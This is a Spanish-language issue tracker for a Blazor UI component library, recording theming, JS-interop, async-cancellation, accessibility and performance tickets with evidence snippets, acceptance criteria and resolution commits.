- **Estado**: ✅ Resuelto (commit `20f64e4`) — eliminadas de `BUIThemePaletteBase` (criterio 1) y también del espejo público `BUIPalette` (Server/Wasm initializer) y del catálogo `PaletteColor`. Consumidores CSS migran a literales `#fff` / `#000` (criterio 3): `BUIColorPicker.razor.css` (handler border + shadow) y `PickerFamilyGenerator.cs` (slider::after background). `ThemeInterop.ts PALETTE_VARS` se reduce de 23 a 21 entradas. Tests que hardcodeaban `--palette-black`/`--palette-white` en paletas fake (`BUIInitializerRenderingTests`, `BUIBlazorLayoterStateTests`, `PaletteColorTests`) migran a la lista reducida — las entradas Black/White de `PaletteColor_ImplicitString_Should_Produce_Var_Reference` desaparecen. Light/Dark themes no sobreescribían Black/White (ningún override perdido). 2540/2540 tests pasan (2 InlineData eliminadas). Las constantes `BUIColor.Black.Default`/`White.Default` siguen disponibles para quien necesite el color "absoluto" en C# — la paleta tema ya no las expone.
- **Severidad**: Minor
- **Esfuerzo**: S
- **Alcance**: `src/CdCSharp.BlazorUI.Core/Themes/Abstractions/BUIThemePaletteBase.cs:12,37`.
- **Evidencia**:
  ```csharp
  public CssColor Black { get; set; } = new("#010101");
  public CssColor White { get; set; } = new("#e9e9e9");
  ```
  `GetThemeVariables()` recorre **todas** las propiedades `CssColor` con reflection; emite `--dark-black`, `--dark-white`, `--light-black`, `--light-white` (luego renamed a `--palette-black`, `--palette-white`). Pero Black/White son colores absolutos, no del tema — no cambian entre Light y Dark en ninguna paleta real. Su presencia en la superficie de paleta confunde: ¿son "el color negro del tema" (pero el tema oscuro debería invertirlos) o "la constante negra"?
- **Criterios de aceptación**:
  1. Moverlos fuera de `BUIThemePaletteBase` a `BUIColor.Black.Default` / `BUIColor.White.Default` (ya existen via `[AutogenerateCssColors]`).
  2. Eliminar la emisión de `--palette-black` / `--palette-white` del bundle.
  3. Componentes que consuman `var(--palette-black/white)` migran a `#000` / `#fff` literales o a `var(--palette-background-contrast)`.
- **Notas**: depura la superficie pública. Alinea con `API-02` y `THEME-03` (paridad).

---

### `THEME-08` — `BUIThemePaletteBase.GetPaletteMapping()` sin uso en producción (solo test): API muerta o pendiente de uso

- **Estado**: ✅ Resuelto (commit `c288b48`, opción b aplicada) — `BUIThemePaletteBase.GetPaletteMapping()` eliminado junto con los 2 tests dedicados (`GetPaletteMapping_Should_Emit_Palette_Vars_For_All_Colors` + `Palette_Mapping_And_Theme_Variables_Should_Cover_Same_Properties`). La API pública se limpia de un método sin consumidor en producción — el emitter real (`ThemesCssGenerator`) usa `GetThemeVariables()` + un `.Replace("--dark-", "--palette-")` (tracked en `CSS-BUNDLE-03`). El flujo "palette aliased" diseñado inicialmente queda descartado; si en futuro se quiere reintroducir, será decisión explícita vía nueva tarea. `PublicAPI.{Shipped,Unshipped}.txt` siguen vacíos pre-1.0 — sin impacto en tracking. 2542/2542 tests pasan (baja desde 2546: 2 `[Theory]` × 2 themes = 4 tests eliminados). Cross-ref: `CSS-BUNDLE-03` sigue abierta y cubrirá el replace frágil cuando toque.
- **Severidad**: Minor
- **Esfuerzo**: XS
- **Alcance**: `src/CdCSharp.BlazorUI.Core/Themes/Abstractions/BUIThemePaletteBase.cs:44-59`. Único consumidor: `test/CdCSharp.BlazorUI.Tests.Integration/Tests/Library/ThemePaletteTests.cs`.
- **Evidencia**: método público que produce `{"--palette-background": "var(--dark-background)"}`. Ni `ThemesCssGenerator` ni `CssInitializeThemesGenerator` lo usan; el emitter actual es `GetThemeVariables()`. Probablemente diseñado para un flujo "aliased palette" (un archivo CSS con `--palette-*` referenciando las `--dark-*`/`--light-*` via `var()`), pero ese flujo no se ejecuta.
- **Criterios de aceptación**:
  1. Decidir: **(a)** habilitar el flujo aliased (potencial mejora: `--palette-*` se referencia siempre via `var(--<tema>-*)`, permitiendo overrides runtime más limpios); **(b)** eliminar el método y test.
  2. Si (a): consumir `GetPaletteMapping()` en un `PaletteAliasingCssGenerator` y cambiar `ThemesCssGenerator.Replace("--dark-", "--palette-")` por la estructura aliased.
  3. Si (b): eliminar método + test asociado.
- **Notas**: cruzado con `CSS-BUNDLE-03` (fragile replace). La solución (a) resuelve CSS-BUNDLE-03 también.

---

### `JS-07` — `PatternInterop.ts` usa `data-pattern-id` sin prefijo `bui-`: rompe convención de atributos

- **Estado**: ✅ Resuelto (commit `6a21b76`) — los 4 atributos `data-pattern-id`, `data-index`, `data-maxlength`, `data-toggle` pasan a `data-bui-*`. Actualizado: `BUIDateTimePattern.razor` (emisión), `PatternInterop.ts` (selectores + `dataset.bui*` keys), `VerifyConfig.cs` scrubber, tests `BUIInputDateTimeInteractionTests` (2 sitios), snapshots `.verified.txt` (Server/Wasm). 2546/2546 tests pasan. `data-has-value` queda sin prefijo para un micro-fix posterior — fuera del scope declarado de esta tarea.
- **Severidad**: Minor
- **Esfuerzo**: S
- **Alcance**: `src/CdCSharp.BlazorUI/Types/Pattern/PatternInterop.ts:324-332` (`element.closest('[data-pattern-id]')`), emisión en componentes `BUIBasePattern`/`BUIDateTimePattern`.
- **Evidencia**: el framework consolida todos los atributos de runtime bajo el prefijo `data-bui-*` (ver `FeatureDefinitions.DataAttributes`). `data-pattern-id` es el único atributo sin el prefijo. Los spans interiores también usan `data-index`, `data-maxlength`, `data-toggle` sin prefijo — superficies ad-hoc.
- **Criterios de aceptación**:
  1. Migrar a `data-bui-pattern-id`, `data-bui-index`, `data-bui-maxlength`, `data-bui-toggle`.
  2. Actualizar el C# que emite estos atributos (`BUIBasePattern`, `BUIDateTimePattern`) y el TS que los lee.
  3. Test de integración: la lista de `data-*` sobrevivientes en el render del patrón no contiene ninguno sin prefijo `bui-`.
- **Notas**: alinea con `CSS-BUNDLE-01` (consistencia de prefijo `data-bui-*` vs `data-theme`).

---

### `JS-08` — Shape de interops inconsistente: `initialize/dispose` vs `attachBehaviors()` vs `startDrag/stopDrag` vs `lockScroll/trapFocus/...`

- **Severidad**: Minor
- **Esfuerzo**: M
- **Alcance**: 11 módulos TS bajo `src/CdCSharp.BlazorUI/Types/`.
- **Evidencia**: exports por módulo:
  - `Theme`: `initialize, getTheme, setTheme, toggleTheme, getPalette` (sin dispose — global state, OK).
  - `Behaviors`: `attachBehaviors(config)` devuelve instancia con `.dispose()`.
  - `Dropdown`: `initialize, getPosition, focusSearchInput, dispose` (canónico).
  - `Draggable`: `startDrag, stopDrag` (nombres diferentes de init/dispose).
  - `Modal`: `lockScroll, unlockScroll, trapFocus, releaseFocus, waitForAnimationEnd` (API rica sin init/dispose obvio).
  - `Pattern`: `initializePattern, disposePattern, updateSpanValue, selectSpanContent, setCaretToEnd, focusSpan, focusFirstEditable`.
  - `TextArea`: `initializeAutoResize, disposeAutoResize` (sufijo redundante).
  La inconsistencia hace que `ModuleJsInteropBase`-derived wrappers de C# tengan que mapear nombres ad-hoc por módulo; no hay contrato base compartido y los consumidores copian/pegan el patrón con variaciones.
- **Criterios de aceptación**:
  1. Definir contrato TS estándar: `initialize(elementOrConfig, dotnetRef, componentId)` + `dispose(componentId)` como mínimo común; los helpers adicionales se exportan además.
  2. Migrar `Draggable` → `initialize/dispose`, `Pattern` → `initialize/dispose` (sin sufijo `Pattern`), `TextArea` → `initialize/dispose` (sin sufijo `AutoResize`), `Behaviors` → `initialize` directo en vez de `attachBehaviors`.
  3. Actualizar los wrappers C# acorde.
- **Notas**: breaking change interno (ningún consumidor externo llama a TS directamente salvo DebugPanel que está fuera del pipeline — ver `JS-12`). Documentar en release notes.

---

### `JS-09` — `ModalInterop.FOCUSABLE_SELECTORS` omite `[contenteditable]` y `audio/video[controls]`

- **Estado**: ✅ Resuelto (commit `2dd1428`) — `FOCUSABLE_SELECTORS` extendido con `[contenteditable=""]`, `[contenteditable="true"]`, `audio[controls]`, `video[controls]`, `iframe`, `embed`, `object`. Alineado con `focus-trap`/`ariakit`. Criterio 2 (test runtime del trap con `<div contenteditable>`) requiere ejecución JS real — bUnit no corre los listeners; se validará en el pase E2E/`A11Y-10` (axe + Playwright).
- **Severidad**: Minor
- **Esfuerzo**: XS
- **Alcance**: `src/CdCSharp.BlazorUI/Types/Modal/ModalInterop.ts:20-27`.
- **Evidencia**:
  ```typescript
  const FOCUSABLE_SELECTORS = [
      'button:not([disabled])', '[href]',
      'input:not([disabled])', 'select:not([disabled])',
      'textarea:not([disabled])', '[tabindex]:not([tabindex="-1"])'
  ].join(', ');
  ```
  Omite elementos focuseables: `[contenteditable="true"]`, `[contenteditable=""]`, `audio[controls]`, `video[controls]`, `iframe`, `embed`, `object`. Un modal con un editor de texto rich (content-editable) no atrapa correctamente el foco en ese editor.
- **Criterios de aceptación**:
  1. Extender la lista con los selectores faltantes (referencia: `focus-trap` npm package o `ariakit`).
  2. Test: modal con `<div contenteditable>` recibe foco y Tab cicla correctamente.
- **Notas**: A11Y. Alinea con `A11Y-xx`.

---

### `JS-10` — `DropdownInterop` y `DraggableInterop` instalan handlers en `document` global sin scoping: polución cross-componente

- **Estado**: ✅ Resuelto (commit `60d2b03`) — `DropdownInterop` reescrito según criterio 1: un único par de handlers `mousedown`/`keydown` a nivel `document`, instalados al primer `initialize`, removidos cuando el último `dispose` deja `dropdownInstances.size === 0`. Helpers `ensureListeners()` / `maybeRemoveListeners()` controlan el ciclo. Cada handler itera el `Map<componentId, DropdownInstance>` y resuelve `closest('[data-bui-component="dropdown-container"]')` por instancia — misma lógica que antes pero amortizada (N dropdowns activos = 1 listener cada tipo, no N). El campo `componentId`-scoped `clickOutsideHandler`/`keyDownHandler` desaparece de `DropdownInstance`. `DraggableInterop` aplica criterio 2: comentario inline documenta el contrato single-instance + nuevo guard `if (instances.size > 0) for(...) stopDrag(id)` antes de `instances.set` evita acumulación si por race se solapan dos `startDrag`. Criterio 3 (perf test 10 dropdowns) requiere instrumentación E2E — fuera del scope de tests bUnit; el cambio es estructural y los 122 tests existentes de Dropdown + Draggable siguen verdes.
- **Severidad**: Minor
- **Esfuerzo**: S
- **Alcance**: `DropdownInterop.ts:92-93,129-130` (`document.addEventListener('mousedown'/'keydown', ...)`); `DraggableInterop.ts:25-26,35-36` (`document.addEventListener('mousemove'/'mouseup', ...)`).
- **Evidencia**: N dropdowns abiertos simultáneamente = N `mousedown` handlers global + N `keydown`. Cada evento se dispara para todos los handlers, que resuelven su propio `closest('[data-bui-component="dropdown-container"]')`. Para dropdowns cerrados, el handler sigue instalado hasta `dispose(componentId)` — si el consumer no lo llama (ver `COMP-INPUTDROPDOWN-01` riesgo de double-dispose) puede quedar colgado.
  Draggable similar: durante drag, O(drags activos) handlers evalúan el mousemove.
- **Criterios de aceptación**:
  1. Dropdown: sustituir listeners globales por un *manager* único que mantiene `Set<componentId>` y dispacha a los activos; handlers globales instalados/desinstalados según si hay al menos uno activo.
  2. Draggable: sólo un drag concurrente por design — añadir assert que si se llama `startDrag` mientras `instances.size > 0`, se reemplaza.
  3. Perf test: abrir 10 dropdowns, cerrar 9, el 1 restante sigue respondiendo correctamente sin lag.
- **Notas**: micro-optimización de runtime pero importante para UX en páginas densas.

### `ASYNC-06` — `ModalReference._resultSource` sin `TaskCreationOptions.RunContinuationsAsynchronously`: continuaciones ejecutan síncronamente en el thread del caller

- **Estado**: ✅ Resuelto (commit `6235fb0`) — `_resultSource` construido con `TaskCreationOptions.RunContinuationsAsynchronously`. Las continuaciones del awaiter de `ShowAndWaitAsync` ya no bloquean al caller de `CloseAsync`/`Cancel`. Criterio 2 (revisar otros TCS) → `ModuleJsInteropBase.IsModuleTaskLoaded` queda fuera de scope porque `JS-04` propone eliminarlo entero; no hay otros TCS en `src/**`.
- **Severidad**: Minor
- **Esfuerzo**: XS
- **Alcance**: `src/CdCSharp.BlazorUI/Components/Layout/Dialog/ModalReference.cs:6`.
- **Evidencia**:
  ```csharp
  private readonly TaskCompletionSource<object?> _resultSource = new();
  // ...
  public Task CloseAsync() {
      _resultSource.TrySetResult(null);   // continuaciones ejecutan aquí, síncronamente
      _onClose(this);
      return Task.CompletedTask;
  }
  ```
  Por defecto, `TaskCompletionSource<T>.TrySetResult` ejecuta las continuaciones **en línea** sobre el thread que lo invoca. Si el awaiter de `Result` (ver `ModalService.ShowAndWaitAsync` → `await state.Reference.Result`) tiene una continuación costosa o re-entra en el `SynchronizationContext` del circuito, se bloquea al caller de `CloseAsync`. Microsoft guideline recomienda `TaskCreationOptions.RunContinuationsAsynchronously` para TCS usados como puntos de sincronización entre callers.
- **Criterios de aceptación**:
  1. `new TaskCompletionSource<object?>(TaskCreationOptions.RunContinuationsAsynchronously)`.
  2. Revisar otros TCS en la librería — `ModuleJsInteropBase.IsModuleTaskLoaded` (ver `JS-04`) debería heredar la misma convención si se mantiene viva.
- **Notas**: fix trivial; bajo riesgo.

### `ASYNC-07` — `BUIToast._progressTimer.Elapsed` re-entra en 50ms sin garantía de terminar: races acumulables

- **Estado**: ✅ Resuelto (commit `6c3f9a4`) — `System.Timers.Timer` sustituido por `PeriodicTimer` dentro de `RunProgressLoopAsync(token)` disparado en `OnInitialized` y cancelable por `_disposeCts`. Como `WaitForNextTickAsync` awaita hasta la siguiente cadencia, el loop **no puede re-entrar**: si un `StateHasChanged` tarda > tick, la siguiente tick espera. Pause/Resume ahora usan `_progressPaused` (volatile bool) — el tick sigue corriendo pero skipa la ronda de render. Intervalo subido de 50ms → 100ms (criterio 2 de notas). Catches añadidos: `OperationCanceledException`, `JSDisconnectedException`, `ObjectDisposedException`, `InvalidOperationException`.
- **Severidad**: Minor
- **Esfuerzo**: S
- **Alcance**: `src/CdCSharp.BlazorUI/Components/Layout/Toast/BUIToast.razor:53-55`.
- **Evidencia**:
  ```csharp
  _progressTimer = new System.Timers.Timer(50);
  _progressTimer.Elapsed += (_, _) => InvokeAsync(StateHasChanged);
  _progressTimer.Start();
  ```
  `System.Timers.Timer.Elapsed` dispara sobre el `ThreadPool` sin esperar a que el handler anterior termine. `InvokeAsync(StateHasChanged)` retorna un `Task` que el lambda descarta (lambda es `EventHandler<ElapsedEventArgs>`, retorno void). Con `AutoReset=true` (default), si el render tarda > 50ms (posible en circuitos cargados o WASM durante un GC), se encolan múltiples `StateHasChanged` que ocupan el render loop. Además cualquier excepción dentro de `InvokeAsync` (p. ej. `JSDisconnectedException` durante shutdown) es silenciosa.
- **Criterios de aceptación**:
  1. `_progressTimer.AutoReset = false;` y re-armar desde el handler después de completar el `InvokeAsync` con `await`.
  2. Alternativamente: sustituir por `PeriodicTimer` en un `Task` cancelable por `_disposeCts` — patrón más idiomático en .NET 10.
  3. Capturar `JSDisconnectedException`/`ObjectDisposedException` en el handler.
- **Notas**: el intervalo de 50ms es muy agresivo para una barra de progreso; valorar subirlo a 100ms.

### `ASYNC-08` — `BUIToast.OnParametersSetAsync` ejecuta `Task.Delay` sin `CancellationToken` y continúa sobre componente potencialmente disposed

- **Estado**: ✅ Resuelto (commit `2959009`) — añadido `_disposeCts` al componente, cancelado + disposed en `Dispose()`. `Task.Delay` de la animación de cierre recibe `_disposeCts.Token`; el try/catch cubre `TaskCanceledException` y `ObjectDisposedException`. Guard post-await `if (_disposeCts.IsCancellationRequested) return;` antes de `OnCloseAnimationComplete.InvokeAsync`.
- **Severidad**: Minor
- **Esfuerzo**: XS
- **Alcance**: `src/CdCSharp.BlazorUI/Components/Layout/Toast/BUIToast.razor:63-68`.
- **Evidencia**:
  ```csharp
  if (State.IsClosing)
  {
      _progressTimer?.Stop();
      await Task.Delay((int)State.Options.Animation.Duration.TotalMilliseconds);
      await OnCloseAnimationComplete.InvokeAsync(State.Id);
  }
  ```
  Ni `Task.Delay` ni `InvokeAsync` reciben `CancellationToken` del componente. Si el componente se dispone mientras la animación está en curso (p. ej. navegación), la continuación del `await` ejecuta `OnCloseAnimationComplete.InvokeAsync` sobre un `EventCallback` de un padre que puede ya haber soltado sus handlers. `EventCallback` tolera caller disposed, pero no hay disposed-guard tras el delay.
- **Criterios de aceptación**:
  1. Añadir un `CancellationTokenSource _disposeCts = new();` en el componente, disponerlo en `DisposeAsync`.
  2. `await Task.Delay(..., _disposeCts.Token);` dentro de try/catch `TaskCanceledException`.
  3. Guard post-await: `if (_disposeCts.IsCancellationRequested) return;` antes de `InvokeAsync`.
- **Notas**: mismo patrón aplicable en otras animaciones de cierre (`BUIDialog`, `BUIDrawer`) — verificar y replicar.

### `ASYNC-09` — `BUIInputNumber._accelerationCts` re-asignado sin `Dispose()` del anterior cuando hay re-entrada en `Start*`

- **Estado**: ✅ Resuelto (commit `72b0f17`) — los 4 call sites (`StartIncrement`, `StartDecrement`, `HandleIncrementKeyDown`, `HandleDecrementKeyDown`) delegan en `BeginAcceleration(action)`, que primero llama a `EndAcceleration()` (cancel + dispose del CTS previo) antes de crear el nuevo. Los 4 sitios `Stop*`/`*KeyUp` también consolidados en `EndAcceleration()`. Elimina la race donde un `Start` consecutivo dejaba la acelaración anterior viva en paralelo (double-step).
- **Severidad**: Minor
- **Esfuerzo**: XS
- **Alcance**: `src/CdCSharp.BlazorUI/Components/Forms/Number/BUIInputNumber.razor:399,421,453,485`.
- **Evidencia**:
  ```csharp
  if (EnableAcceleration)
  {
      _accelerationCts = new CancellationTokenSource();   // anterior NO se hace Dispose/Cancel
      _ = RunAcceleratedAction(IncrementValue, _accelerationCts.Token);
  }
  ```
  Cuatro call sites (`StartIncrement`, `StartDecrement`, `HandleIncrementKeyDown`, `HandleDecrementKeyDown`) crean un CTS nuevo sin cancelar/disponer el anterior. La secuencia normal `Start → Stop` limpia bien, pero si el navegador pierde el `mouseup` (p. ej. user arrastra fuera del botón y suelta), el siguiente `Start` deja huérfano el CTS previo — y su `RunAcceleratedAction` continúa ejecutándose en paralelo con el nuevo (efecto visible: double-step).
- **Criterios de aceptación**:
  1. Factorizar los 4 call sites en un `BeginAcceleration(Func<Task> action)` privado que siempre hace `_accelerationCts?.Cancel(); _accelerationCts?.Dispose();` antes de reasignar.
  2. Añadir test: simular `mousedown` → window blur → `mousedown` otra vez, verificar que sólo un `RunAcceleratedAction` está activo.
- **Notas**: cruza con `COMP-INPUTNUMBER-xx` (pendiente en §3.14+).

### `A11Y-05` — Focus return al cerrar Dialog/Drawer depende del singleton `focusTrapState`: se rompe con modals anidados

- **Severidad**: Minor
- **Esfuerzo**: M
- **Alcance**: `src/CdCSharp.BlazorUI/Components/Layout/Dialog/BUIDialog.razor:174`, `BUIDrawer.razor:147` (`await JsInterop.ReleaseFocusAsync();`); `src/CdCSharp.BlazorUI/Types/Modal/ModalInterop.ts:12-18` (singleton `focusTrapState`).
- **Evidencia**: `ReleaseFocusAsync` restaura `focusTrapState.previousFocus`, que es un singleton global según `JS-03`. Con modales anidados, el segundo `activate()` sobreescribe `previousFocus` con el primer modal, perdiendo el foco *raíz* (el trigger original). Al cerrar los dos modales en orden, el foco no regresa al elemento pre-modal, rompiendo WCAG 2.4.3 Focus Order.
- **Criterios de aceptación**:
  1. Depende de `JS-03` (stack de focus traps en TS).
  2. Desde el lado C#: asegurar que `BUIDialog`/`BUIDrawer` pasan un identificador al activate/release para que el stack JS pueda desactivar el correcto.
  3. Test: consumer razor que abre dialog → dentro abre otro dialog → cierra los dos. Verificar con `FocusAsync().ElementReference` que el foco final es el trigger raíz.
- **Notas**: bloquea por `JS-03`. No puede resolverse aquí aisladamente.

### `A11Y-06` — `BUITooltip` emite `role="tooltip"` pero no conecta `aria-describedby` en el trigger

- **Severidad**: Minor
- **Esfuerzo**: S
- **Alcance**: `src/CdCSharp.BlazorUI/Components/Utils/Tooltip/BUITooltip.razor:24` (`role="tooltip"`); el trigger (`ChildContent` wrapper) no recibe `aria-describedby="@_tooltipId"`.
- **Evidencia**: `grep -n aria-describedby BUITooltip.razor` → 0. El tooltip visible tiene `role="tooltip"`, pero el wrapper del trigger (donde reside el elemento focusable) no referencia el id del tooltip. Screen readers no asocian el texto del tooltip con el elemento enfocado. WCAG 4.1.2 Name, Role, Value (association).
- **Criterios de aceptación**:
  1. Generar un `_tooltipId` único por instancia.
  2. El wrapper del trigger (`<span>`/`<bui-component>` externo) recibe `aria-describedby="@_tooltipId"` cuando `_isVisible`.
  3. El tooltip visible recibe `id="@_tooltipId"`.
  4. Test a11y: renderizar tooltip con trigger, simular hover/focus, verificar que `cut.Find("[role=tooltip]").GetAttribute("id")` coincide con `cut.Find("[aria-describedby]").GetAttribute("aria-describedby")`.
- **Notas**: cambio local; bajo riesgo de regresión.

### `A11Y-07` — `BUIDataGrid`/`BUIDataCards` no anuncian cambios dinámicos (sort/filter/paginación): usuarios de screen reader se pierden actualizaciones

- **Severidad**: Minor
- **Esfuerzo**: M
- **Alcance**: `src/CdCSharp.BlazorUI/Components/Generic/DataCollections/DataGrid/BUIDataGrid.razor`; `src/CdCSharp.BlazorUI/Components/Generic/DataCollections/DataCards/BUIDataCards.razor`.
- **Evidencia**: operaciones tipo sort, filter o cambio de página mutan la tabla sin declarar `aria-live` en una región que anuncie el nuevo estado ("Tabla ordenada por 'Nombre' ascendente", "Mostrando página 2 de 5", "3 filas tras aplicar filtro"). Incumple WCAG 4.1.3 Status Messages para tablas dinámicas.
- **Criterios de aceptación**:
  1. Añadir una región `<bui-component role="status" aria-live="polite" class="sr-only">` en el layout del grid, actualizada tras cada operación.
  2. Contenido: `"Ordenado por {columna} ({dirección}). {n} filas visibles de {total}. Página {p} de {max}."`.
  3. Incluir clase utilitaria `.sr-only` en `_base.css` si no existe (posición absoluta, clip:rect, etc.).
- **Notas**: cruza con `A11Y-10` (auditoría axe) que probablemente señale esto automáticamente.

### `A11Y-08` — `BUITabs`: verificar keyboard support completo (Home/End/flechas/Arrow wrap) según WAI-ARIA Tabs pattern

- **Severidad**: Minor
- **Esfuerzo**: S
- **Alcance**: `src/CdCSharp.BlazorUI/Components/Generic/Tabs/BUITabs.razor` (handler `HandleKeyDown`).
- **Evidencia**: existe `@onkeydown="e => HandleKeyDown(e, tabs, tab.Id)"` pero sin revisar el método no se puede afirmar que cubra `ArrowLeft`/`ArrowRight` (horizontal), `ArrowUp`/`ArrowDown` (vertical), `Home` (primera tab), `End` (última tab). El patrón WAI-ARIA Tabs lo exige. Además, `tabindex` debería seguir el patrón roving (`tabindex="0"` en la activa, `tabindex="-1"` en las demás — código muestra exactamente eso, bien).
- **Criterios de aceptación**:
  1. Auditar `HandleKeyDown` y añadir teclas que falten (`Home`, `End`, posiblemente `ArrowUp`/`ArrowDown` si se soporta orientación vertical en el futuro).
  2. Tests en `BUITabsAccessibilityTests.cs` para cada tecla.
  3. Al llegar al extremo con flechas, decidir política: wrap (ArrowRight en última → primera) o stop. Documentar.
- **Notas**: tarea puede convertirse en Polish si el HandleKeyDown actual ya cubre todo.

### `A11Y-09` — `_BUIFieldHelper` y mensajes de validación no son `aria-live`: errores de form no se anuncian

- **Severidad**: Minor
- **Esfuerzo**: S
- **Alcance**: `src/CdCSharp.BlazorUI/Components/Internal/_BUIFieldHelper.razor`; `src/CdCSharp.BlazorUI/Components/Forms/**/*.razor` (todos los que referencian `_BUIFieldHelper`).
- **Evidencia**: los inputs emiten `aria-describedby="@_helperTextId"` (correcto), pero el contenido del helper text (que incluye el texto de validación dinámico) no tiene `aria-live="polite"` ni `role="status"`. Cuando `EditContext` falla y el helper muestra el error, un screen reader que había enfocado otro elemento no escucha la actualización. WCAG 4.1.3 Status Messages + SC 3.3.1 Error Identification.
- **Criterios de aceptación**:
  1. Añadir `aria-live="polite"` en el contenedor del helper text cuando hay error activo, o `role="alert"` si la validación es inmediata (on blur).
  2. Idealmente, diferenciar: `role="alert"` para errores; `aria-live="polite"` para texto informativo.
  3. Tests a11y por componente de form que validan presencia del atributo cuando `IsError=true`.
- **Notas**: impacta a 9 componentes de form (ver `Grep _BUIFieldHelper|validation-message` más arriba).

### `PERF-04` — `BuildStyles` ejecuta lógica por parámetro en cada `OnParametersSet` sin dirty-tracking: recomputa estilo aunque cambie un callback

- **Severidad**: Minor
- **Esfuerzo**: M
- **Alcance**: `src/CdCSharp.BlazorUI.Core/Components/BUIComponentBase.cs:66-85`.
- **Evidencia**: `OnParametersSet()` llama a `_styleBuilder.BuildStyles(this, AdditionalAttributes);` *siempre*. Blazor invoca `OnParametersSet` cuando *cualquier* parámetro cambia — incluido cuando el padre pasa una closure nueva para `OnClick` / `ChildContent` aunque los atributos de estilo sean idénticos. Relación con `PERF-02`: aquí el defecto es el **trigger**, allí el **cuerpo**.
- **Criterios de aceptación**:
  1. En caso de avanzar con fingerprinting (`PERF-02`), este ticket se consolida — mark as duplicate.
  2. Alternativa: exponer virtual `ShouldRebuildStyles()` que devuelve false por defecto sólo si la subclase lo overridea tras validar su propia dirty-tracking. Poco idiomático — preferible `PERF-02`.
- **Notas**: marcar como dependiente de `PERF-02`.

### `PERF-05` — `BUIToastHost` itera `Enum.GetValues<ToastPosition>()` en cada render: array allocation repetida

- **Estado**: ✅ Resuelto (commit `b5cb727`) — `private static readonly ToastPosition[] _allPositions = Enum.GetValues<ToastPosition>();` en `BUIToastHost.razor`; el `@foreach` usa `_allPositions`. Allocation-per-render → 0.
- **Severidad**: Minor
- **Esfuerzo**: XS
- **Alcance**: `src/CdCSharp.BlazorUI/Components/Layout/Toast/BUIToastHost.razor:13`.
- **Evidencia**:
  ```razor
  @foreach (ToastPosition position in Enum.GetValues<ToastPosition>())
  ```
  `Enum.GetValues<T>()` devuelve un nuevo `T[]` en cada invocación (las implementaciones pre-.NET 7 hacían reflection; .NET 7+ lo acelera con intrinsics pero sigue allocating). Con un `HandleToastChange` que dispara `StateHasChanged` por toast creado/cerrado, cada re-render instancia un array de 6 elementos (`ToastPosition`) + itera.
- **Criterios de aceptación**:
  1. `private static readonly ToastPosition[] _allPositions = Enum.GetValues<ToastPosition>();` y usar esa referencia.
  2. Test de regresión: sin cambios en output.
- **Notas**: micro-optimización; interesante sólo a alta frecuencia de toasts.

### `PERF-06` — `Variant.Name.ToLowerInvariant()` por render en `BuildStyles`: lowercasear strings de variantes que son conocidos en build-time

- **Estado**: ✅ Resuelto (commit `e26d012`) — `Variant` base cachea `internal string NameLower { get; }` en el constructor (una vez por instancia, que son singletons `static readonly`). `BUIComponentAttributesBuilder` consume `NameLower`. `internal` evita ampliar superficie pública. Contrato de `Name` case-preserving intacto.
- **Severidad**: Minor
- **Esfuerzo**: XS
- **Alcance**: `src/CdCSharp.BlazorUI.Core/Components/BUIComponentAttributesBuilder.cs:108`; `src/CdCSharp.BlazorUI.Core/Components/Variants/` (`IVariantRegistry` y variant structs).
- **Evidencia**:
  ```csharp
  ComputedAttributes[...Variant] = variantComponent.CurrentVariant.Name.ToLowerInvariant();
  ```
  Cada render genera un string nuevo en lowercase. Los `Variant.Name` son conocidos en tiempo de construcción (definidos como constantes en cada `BUIButtonVariant.Default`, etc.).
- **Criterios de aceptación**:
  1. Añadir propiedad `NameLower` (cacheada) a la estructura de variante, o normalizar `Name` directamente a lowercase en el constructor.
  2. Sustituir el call site por `variantComponent.CurrentVariant.NameLower`.
  3. Auditar otros usos de `Variant.Name` para ver si todos esperan un formato concreto.
- **Notas**: cruza con `API-xx` (si se decide el contrato de `Name` case-preserving o ya-normalizado).

### `PERF-07` — `PatchVolatileAttributes` ejecuta chequeos aunque el componente no implemente ningún feature volátil

- **Estado**: ✅ Resuelto (commit `b5cb727`) — nueva flag `ComponentFeatures.VolatileMask = Active | Disabled | Loading | Error | ReadOnly | Required | FullWidth`. `PatchVolatileAttributes` devuelve temprano cuando `(flags & (VolatileMask | BuiltComponent)) == 0` → componentes puros como `BUIGrid`/`BUICard` no pagan 7 branches por render.
- **Severidad**: Minor
- **Esfuerzo**: XS
- **Alcance**: `src/CdCSharp.BlazorUI.Core/Components/BUIComponentAttributesBuilder.cs:221-244`.
- **Evidencia**: el método corre **siempre** en `BuildRenderTree`. Si el componente es `BUIGrid` / `BUIGridItem` / `BUICard` (sin estado volátil en `IHas*`), los 7 chequeos `(flags & X) != 0` evalúan con resultado falso en cada render — branches pequeños pero innecesarios para componentes "no-volatile".
- **Criterios de aceptación**:
  1. Añadir una máscara `VolatileMask = Active | Disabled | Loading | Error | ReadOnly | Required | FullWidth` en `ComponentFeatures`.
  2. `if ((flags & VolatileMask) == 0 && (flags & BuiltComponent) == 0) return;` al inicio de `PatchVolatileAttributes`.
  3. Test: componente sin features volátiles no invoca ninguno de los setters del dictionary en `PatchVolatile`.
- **Notas**: fix pequeño; pareja con `PERF-01` (el beneficio real aparece si se activan conjuntamente).

### `PERF-08` — Inputs (`BUIInputText`, `BUIInputNumber`, `BUIInputTextArea`) re-renderizan el árbol completo por keystroke sin `ShouldRender` personalizado

- **Severidad**: Minor
- **Esfuerzo**: M
- **Alcance**: `src/CdCSharp.BlazorUI/Components/Forms/**/*.razor` (todos los inputs que cablean `ValueChanged` a `@oninput`).
- **Evidencia**: `BUIInputComponentBase<TValue>` y sus herederos no sobrescriben `ShouldRender()`. Cada carácter que escribe el usuario dispara `ValueChanged` → re-asigna `Value` en el padre → `StateHasChanged` → cascade render completo de hijos. Para un `BUIInputText` dentro de un `BUICard` dentro de un `BUIStackedLayout`, todos los ancestros re-renderizan por cada keystroke (incluso aunque su output no cambie). En Blazor WASM con muchos inputs, el TTI degrada visiblemente.
- **Criterios de aceptación**:
  1. Medir (con `BUIPerformanceDashboard` o profile) el número de `BuildRenderTree` calls por keystroke en una página con 20 inputs.
  2. Implementar `ShouldRender()` en `BUIInputComponentBase` que retorne `false` si sólo cambió `Value` y el componente acaba de renderizar el mismo `Value` (guard contra echo del round-trip via `ValueChanged`).
  3. Verificar que la solución no rompe el two-way binding.
  4. Alternativamente, documentar en `CLAUDE.md` → `CLAUDE-xx`: "wrap inputs in `@key` or delegate to child components with `ShouldRender => false` in ancestors".
- **Notas**: fix complejo; el diagnóstico puede ser suficiente (dejar a consumer).

